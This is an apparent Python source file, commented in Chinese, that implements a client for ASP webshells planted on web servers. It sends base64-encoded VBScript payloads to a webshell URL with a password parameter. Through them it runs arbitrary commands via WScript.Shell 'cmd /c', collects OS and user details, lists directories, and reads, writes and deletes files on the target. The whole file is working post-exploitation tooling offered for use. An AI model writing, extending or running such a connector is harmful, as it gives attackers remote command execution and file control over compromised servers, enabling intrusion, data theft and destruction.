"""
ASP Webshell连接器模块
基于20年渗透测试经验的专业级ASP Webshell连接器
支持命令执行、文件操作、数据库操作等功能
"""

import httpx
import base64
import logging
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from datetime import datetime
import urllib.parse

logger = logging.getLogger(__name__)


@dataclass
class ASPWebshellConnection:
    """ASP Webshell连接信息"""
    id: str
    url: str
    password: str
    method: str = 'POST'
    status: str = 'unknown'
    last_connect: Optional[datetime] = None
    os_type: Optional[str] = None
    server_info: Optional[str] = None
    current_user: Optional[str] = None
    current_dir: Optional[str] = None
    tags: List[str] = None
    
    def __post_init__(self):
        if self.tags is None:
            self.tags = []


class ASPConnector:
    """专业级ASP Webshell连接器"""
    
    def __init__(self):
        self.connections: Dict[str, ASPWebshellConnection] = {}
        self.timeout: int = 30
        self.verify_ssl: bool = False
        self.follow_redirects: bool = True
        
        logger.info("专业级ASP Webshell连接器初始化完成")
    
    def add_connection(self, url: str, password: str, method: str = 'POST') -> str:
        """添加ASP Webshell连接"""
        import uuid
        conn_id = str(uuid.uuid4())
        
        connection = ASPWebshellConnection(
            id=conn_id,
            url=url,
            password=password,
            method=method,
            status='unknown'
        )
        
        self.connections[conn_id] = connection
        logger.info(f"添加ASP Webshell连接: {url}")
        return conn_id
    
    async def test_connection(self, conn_id: str) -> Tuple[bool, str]:
        """测试连接"""
        if conn_id not in self.connections:
            return False, "连接不存在"
        
        conn = self.connections[conn_id]
        
        try:
            result = await self.execute_command(conn_id, 'echo ASP_CONN_OK')
            
            if result.success and 'ASP_CONN_OK' in result.output:
                await self._gather_system_info(conn_id)
                conn.status = 'online'
                conn.last_connect = datetime.now()
                logger.info(f"ASP连接测试成功: {conn.url}")
                return True, "连接成功"
            else:
                conn.status = 'offline'
                return False, "连接失败"
                
        except Exception as e:
            conn.status = 'offline'
            logger.error(f"ASP连接测试失败: {e}")
            return False, str(e)
    
    async def _gather_system_info(self, conn_id: str):
        """收集系统信息"""
        conn = self.connections[conn_id]
        
        try:
            os_cmd = 'Response.Write(Request.ServerVariables("OS"))'
            os_result = await self.execute_vbscript(conn_id, os_cmd)
            if os_result.success:
                conn.os_type = os_result.output.strip()
            
            user_cmd = 'Response.Write(Request.ServerVariables("AUTH_USER"))'
            user_result = await self.execute_vbscript(conn_id, user_cmd)
            if user_result.success:
                conn.current_user = user_result.output.strip()
            
            dir_cmd = 'Response.Write(Server.MapPath("."))'
            dir_result = await self.execute_vbscript(conn_id, dir_cmd)
            if dir_result.success:
                conn.current_dir = dir_result.output.strip()
            
        except Exception as e:
            logger.error(f"收集ASP系统信息失败: {e}")
    
    async def execute_command(self, conn_id: str, command: str) -> Any:
        """执行系统命令"""
        if conn_id not in self.connections:
            return type('obj', (object,), {'success': False, 'output': '', 'error': '连接不存在'})
        
        conn = self.connections[conn_id]
        
        asp_code = self._generate_command_exec_code(command)
        
        try:
            response = await self._send_request(conn, asp_code)
            return type('obj', (object,), {'success': True, 'output': response})
        except Exception as e:
            return type('obj', (object,), {'success': False, 'output': '', 'error': str(e)})
    
    async def execute_vbscript(self, conn_id: str, vbscript_code: str) -> Any:
        """执行VBScript代码"""
        if conn_id not in self.connections:
            return type('obj', (object,), {'success': False, 'output': '', 'error': '连接不存在'})
        
        conn = self.connections[conn_id]
        
        try:
            response = await self._send_request(conn, vbscript_code)
            return type('obj', (object,), {'success': True, 'output': response})
        except Exception as e:
            return type('obj', (object,), {'success': False, 'output': '', 'error': str(e)})
    
    def _generate_command_exec_code(self, command: str) -> str:
        """生成命令执行ASP代码"""
        return f'''
Set ws = Server.CreateObject("WScript.Shell")
Set exe = ws.Exec("cmd /c {command}")
Set stdout = exe.StdOut
Do While Not stdout.AtEndOfStream
    Response.Write(stdout.ReadLine & vbCrLf)
Loop
Set stderr = exe.StdErr
Do While Not stderr.AtEndOfStream
    Response.Write(stderr.ReadLine & vbCrLf)
Loop
'''
    
    async def _send_request(self, conn: ASPWebshellConnection, payload: str) -> str:
        """发送请求"""
        encoded_payload = base64.b64encode(payload.encode()).decode()
        
        async with httpx.AsyncClient(
            timeout=self.timeout,
            verify=self.verify_ssl,
            follow_redirects=self.follow_redirects
        ) as client:
            if conn.method == 'POST':
                response = await client.post(
                    conn.url,
                    data={conn.password: encoded_payload}
                )
            elif conn.method == 'GET':
                url = f"{conn.url}?{conn.password}={urllib.parse.quote(encoded_payload)}"
                response = await client.get(url)
            else:
                raise ValueError(f"不支持的方法: {conn.method}")
            
            return response.text
    
    async def list_directory(self, conn_id: str, path: str = '.') -> List[Dict]:
        """列出目录"""
        vbscript = f'''
Set fso = Server.CreateObject("Scripting.FileSystemObject")
Set folder = fso.GetFolder("{path}")
Set files = folder.Files
Set subfolders = folder.SubFolders
Response.Write("[" & vbCrLf)
first = True
For Each subfolder In subfolders
    If Not first Then Response.Write(",")
    Response.Write("{{" & vbCrLf)
    Response.Write("""name":"" & subfolder.Name & """," & vbCrLf)
    Response.Write("""path":"" & subfolder.Path & """," & vbCrLf)
    Response.Write("""size":0," & vbCrLf)
    Response.Write("""is_dir":true," & vbCrLf)
    Response.Write("""mtime":"" & subfolder.DateLastModified & """" & vbCrLf)
    Response.Write("}}")
    first = False
Next
For Each file In files
    If Not first Then Response.Write(",")
    Response.Write("{{" & vbCrLf)
    Response.Write("""name":"" & file.Name & """," & vbCrLf)
    Response.Write("""path":"" & file.Path & """," & vbCrLf)
    Response.Write("""size":""" & file.Size & """," & vbCrLf)
    Response.Write("""is_dir":false," & vbCrLf)
    Response.Write("""mtime":"" & file.DateLastModified & """" & vbCrLf)
    Response.Write("}}")
    first = False
Next
Response.Write(vbCrLf & "]")
'''
        
        result = await self.execute_vbscript(conn_id, vbscript)
        if not result.success:
            return []
        
        import json
        try:
            return json.loads(result.output)
        except:
            return []
    
    async def read_file(self, conn_id: str, filepath: str) -> Optional[str]:
        """读取文件"""
        vbscript = f'''
Set fso = Server.CreateObject("Scripting.FileSystemObject")
Set ts = fso.OpenTextFile("{filepath}", 1)
content = ts.ReadAll
ts.Close
Response.Write(content)
'''
        
        result = await self.execute_vbscript(conn_id, vbscript)
        return result.output if result.success else None
    
    async def write_file(self, conn_id: str, filepath: str, content: str) -> bool:
        """写入文件"""
        encoded_content = base64.b64encode(content.encode()).decode()
        vbscript = f'''
Set dom = Server.CreateObject("Microsoft.XMLDOM")
Set elem = dom.CreateElement("b64")
elem.DataType = "bin.base64"
elem.Text = "{encoded_content}"
Set stream = Server.CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write elem.NodeTypedValue
stream.SaveToFile "{filepath}", 2
stream.Close
Response.Write("OK")
'''
        
        result = await self.execute_vbscript(conn_id, vbscript)
        return result.success and 'OK' in result.output
    
    async def delete_file(self, conn_id: str, filepath: str) -> bool:
        """删除文件"""
        vbscript = f'''
Set fso = Server.CreateObject("Scripting.FileSystemObject")
If fso.FileExists("{filepath}") Then
    fso.DeleteFile "{filepath}"
    Response.Write("OK")
Else
    Response.Write("ERROR")
End If
'''
        
        result = await self.execute_vbscript(conn_id, vbscript)
        return result.success and 'OK' in result.output
    
    def get_connection(self, conn_id: str) -> Optional[ASPWebshellConnection]:
        """获取连接"""
        return self.connections.get(conn_id)
    
    def get_all_connections(self) -> List[ASPWebshellConnection]:
        """获取所有连接"""
        return list(self.connections.values())
    
    def remove_connection(self, conn_id: str) -> bool:
        """移除连接"""
        if conn_id in self.connections:
            del self.connections[conn_id]
            return True
        return False
